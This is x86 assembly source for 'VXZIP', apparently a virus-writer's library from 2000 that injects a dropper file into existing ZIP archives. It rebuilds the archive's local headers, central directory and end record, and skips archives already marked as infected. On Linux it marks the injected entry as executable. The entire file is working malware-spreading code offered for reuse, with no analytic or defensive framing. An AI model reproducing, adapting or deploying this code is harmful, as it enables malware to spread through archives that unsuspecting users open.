   ;VXZIP Library
   ;(c) Vecna 2000

   BITS 32

   %define LINUX 1

   %include "izip.i"

   %ifdef LINUX
   global izip_maxaddsize
   global izip_add
   global izip_strlen
   global izip_crc32
   %endif

   ;push ptr2dropname
   ;push sizeof_dropper
   ;call
   izip_maxaddsize:
   ;eax=size that .zip will increase
          push dword [esp+param2]
          call izip_strlen
          lea eax, [eax+eax+(sizeof_zip_central+sizeof_zip_local)]
          add eax, [esp+param1]
          ret 8


   ;push sizeof_zip
   ;push ptr2zip
   ;push ptr2dropname
   ;push sizeof_dropper
   ;push ptr2dropper
   ;call
   izip_add:
   ;eax=new sizeof_map
          pushad
          sub esp, _Stack
          mov esi, [esp+_Pushad+_Stack+param4]
          sub ecx, ecx
     .local_hdr:
          cmp dword [esi+zip_loc_sign_], zip_local_sign
          jne .central_hdr
          movzx eax, word [esi+zip_size_fname]
          mov edx, dword [esi+zip_ver_ned_to_extr]
          mov ebx, dword [esi+zip_file_time]
          inc ecx
          cmp word [esi+zip_compression_method], 0
          jne .seek_next
   %ifndef LINUX
          mov edi, [esi+zip_local_fname+eax-4]
          or edi, 020202000h
          sub edi, ".exe"
   %else
          cmp byte [esi+zip_local_fname+eax-1]
   , "!"
   %endif
          je .error
     .seek_next:
          movzx edi, word [esi+zip_extra_field_length]
          add eax, edi
          add eax, dword [esi+zip_compressed_size]
          lea esi, [eax+esi+sizeof_zip_local]
          jmp .local_hdr
     .central_hdr:
          jecxz .error
          cmp dword [esi+zip_centr_sign_], zip_central_sign
          je .insert_local_hdr
     .error:
          sub ecx, ecx
     .exit:
          add esp, _Stack
          mov [esp+_Pushad_eax], ecx
          popad
          ret 20
     .insert_local_hdr:
          mov ecx, [esp+_Pushad+_Stack+param5]
          add ecx, [esp+_Pushad+_Stack+param4]
          sub ecx, esi
          add esi, ecx
          push dword [esp+_Pushad+_Stack+param3]
          call izip_strlen
          lea edi, [esi+eax+sizeof_zip_local]
          add edi, [esp+_Pushad+_Stack+param2]
          std
          rep movsb
          mov byte [edi], "P"
          cld
          xchg edi, esi
          xchg ecx, ebx
          mov eax, edi
          sub eax, [esp+_Pushad+_Stack+param4]
          mov dword [esp+rel_str_local_hdr], eax
          mov eax, zip_local_sign
          stosd
          mov eax, edx
          stosd                    ;version/flags
          sub eax, eax
          stosw                    ;stored
          mov eax, ecx
          stosd                    ;time/date
          push dword [esp+_Pushad+_Stack+param2]
          push dword [esp+_Pushad+_Stack+param1+_Push]
          call izip_crc32
          stosd                    ;crc32
          mov eax, [esp+_Pushad+_Stack+param2]
          stosd
          stosd                    ;size
          mov esi, [esp+_Pushad+_Stack+param3]
          push esi
          call izip_strlen
          sub ecx, ecx
          stosw                    ;name size
          xchg eax, ecx
          stosw                    ;extra size
          rep movsb                ;name
          mov ecx, [esp+_Pushad+_Stack+param2]
          mov esi, [esp+_Pushad+_Stack+param1]
          rep movsb                ;copy dropper
          mov esi, edi
          sub edi, [esp+_Pushad+_Stack+param4]
          mov dword [esp+rel_str_central_hdr], edi
     .zip_end_hdr:
          cmp dword [esi+zip_centr_sign_], zip_central_sign
          jne .insert_central_hdr
          movzx eax, word [esi+zip_size_fname_]
          movzx edx, word [esi+zip_extra_field_length_]
          add eax, edx
          movzx edx, word [esi+zip_file_comment_length_]
          add eax, edx
          mov edx, [esi+zip_ver_made_by_]
          test byte [esi+zip_extrnl_file_attr_], 10h
          jnz .skip_dir
          mov ebx, [esi+zip_file_time_]
          mov edi, [esi+zip_disk_number_start_]
          mov ecx, [esi+zip_flags_]
     .skip_dir:
          lea esi, [esi+eax+sizeof_zip_central]
          jmp .zip_end_hdr
     .insert_central_hdr:
          cmp dword [esi+zip_end_sign_], zip_end_sign
          jne near .error
          push dword [esp+_Pushad+_Stack+param3]
          call izip_strlen
          push eax
          pushad
          add eax, sizeof_zip_central
          lea edi, [esi+eax]
          add [esi+size_of_the_central_directory], eax
          movzx eax, word [esi+zipfile_comment_length]
          lea ecx, [eax+sizeof_zip_end]
          add edi, ecx
          add esi, ecx
          std
          rep movsb
          mov byte [edi], "P"
          cld
          popad
          xchg edi, esi
          mov eax, zip_central_sign
          stosd                            ;sign
          mov eax, edx
          stosd                            ;version
          mov eax, ecx
          stosw                            ;flag
          pop ecx
          sub eax, eax
          stosw                            ;method
          xchg eax, ebx
          stosd                            ;time/date
          push dword [esp+_Pushad+_Stack+param2]
          push dword [esp+_Pushad+_Stack+param1+_Push]
          call izip_crc32
          stosd                            ;crc32
          mov eax, [esp+_Pushad+_Stack+param2]
          stosd
          stosd                            ;size
          mov eax, ecx
          stosw                            ;name size
          xchg eax, ebx
          stosd                            ;extra size
          xchg eax, esi
          stosd                            ;disk/attr
   %ifndef LINUX
          xchg eax, esi                    ;no file attributes
   %else
          mov eax, 0816d0000h              ;r-xr-xr-x
   %endif
          stosd     ;
          mov eax, [esp+rel_str_local_hdr]
          stosd
          mov esi, [esp+_Pushad+_Stack+param3]
          rep movsb
          mov esi, edi
     .check_end:
          cmp dword [esi+zip_end_sign_], zip_end_sign
          jne near .error
          add dword [esi+ttl_num_of_ent_on_this_disk], 00010001h
          mov eax, [esp+rel_str_central_hdr]
          mov dword [esi+off_of_strt_of_cent_directory], eax
          movzx eax, word [esi+zipfile_comment_length]
          lea ecx, [esi+eax+sizeof_zip_end]
          sub ecx, [esp+_Pushad+_Stack+param4]
          jmp .exit


   ;push sizeof_data
   ;push ptr2data
   ;call
   izip_crc32:
   ;eax=crc32
          pushad
          mov edx, [esp+_Pushad+param1]
          mov ecx, [esp+_Pushad+param2]
          push byte -1
          pop eax
     .bigloop:
          xor al, [edx]
          inc edx
          mov bl, 8
     .bitloop:
          shr eax, 1
          jnc .no_hash
          xor eax, 0EDB88320h
     .no_hash:
          dec bl
          jnz .bitloop
          loop .bigloop
          not eax
          mov [esp+_Pushad_eax], eax
          popad
          ret 8


   ;push ptr2string
   ;call
   izip_strlen:
   ;eax=lenght of the string
          pushad
          mov esi, [esp+_Pushad+param1]
          sub ecx, ecx
     .count:
          lodsb
          test al, al
          jz .done
          inc ecx
          jmp .count
     .done:
          mov [esp+_Pushad_eax], ecx
          popad
          ret 4
